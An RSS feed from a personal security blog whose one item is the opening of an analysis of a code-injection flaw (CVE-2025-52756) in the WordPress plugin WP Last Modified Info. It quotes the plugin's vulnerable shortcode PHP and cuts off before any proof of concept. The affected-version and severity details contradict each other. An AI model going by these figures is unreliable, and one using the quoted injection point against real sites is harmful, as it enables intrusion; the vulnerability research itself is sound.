<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Bui Van Y</title>
    <link>http://localhost:1313/</link>
    <description>Bui Van Y</description>
    <generator>Hugo 0.152.2 &amp; FixIt v0.4.0-alpha.3-20251128065536-6d00e42b</generator>
    <language>en</language>
    <managingEditor>w41bu1@gmail.com (Bui Van Y)</managingEditor>
    <webMaster>w41bu1@gmail.com (Bui Van Y)</webMaster>
    <lastBuildDate>Mon, 01 Dec 2025 13:04:27 +0700</lastBuildDate>
    <atom:link href="http://localhost:1313/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>CVE-2025-52756 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-12-02-cve-2025-52756/</link>
      <pubDate>Tue, 02 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-12-02-cve-2025-52756/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-02-cve-2025-52756/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;Improper Control of Generation of Code (&amp;lsquo;Code Injection&amp;rsquo;)&lt;/strong&gt; vulnerability in Sayan Dattaâ€™s &lt;strong&gt;WP Last Modified Info (wp-last-modified-info)&lt;/strong&gt; plugin allows &lt;strong&gt;Remote Code Inclusion&lt;/strong&gt;. This issue affects &lt;strong&gt;WP Last Modified Info&lt;/strong&gt; from &lt;strong&gt;n/a&lt;/strong&gt; through &lt;strong&gt;&amp;lt;= 1.9.2&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-52756&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-52756&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Remote Code Execution&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.9.4&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.9.5&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (7.2)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/wp-last-modified-info/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress WP Last Modified Info Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Plugin Version â€“ WP Last Modified Info&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;1.9.4&lt;/code&gt; â€“ &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;1.9.5&lt;/code&gt; â€“ &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Diff Tool&lt;/strong&gt; â†’ &lt;strong&gt;Meld&lt;/strong&gt; or any diff tool.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;In the vulnerable version (v1.9.4):&lt;/strong&gt;&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;render&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$atts&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$post&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;get_post&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$post&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;instanceof&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;\WP_Post&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;is_enabled&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;enable_last_modified_cb&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$author_id&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get_meta&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$post&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;ID&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;_edit_last&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;is_equal&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;show_author_cb&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;custom&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;default&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$author_id&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get_data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;lmt_show_author_list&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$default_format&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;get_option&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;date_format&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$atts&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;shortcode_atts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;id&amp;#39;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$post&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;ID&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;template&amp;#39;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get_data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;lmt_last_modified_info_template&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;date_format&amp;#39;&lt;/span&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get_data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;lmt_date_time_format&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$default_format&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;date_type&amp;#39;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get_data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;lmt_last_modified_format_post&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;default&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;schema&amp;#39;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get_data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;lmt_enable_jsonld_markup_cb&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;disable&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;author_id&amp;#39;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$author_id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;hide_archive&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;filter_ids&amp;#39;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;gap&amp;#39;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get_data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;lmt_gap_on_post&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$atts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;lmt-post-modified-info&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_post&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;get_post&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;absint&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$atts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;id&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span 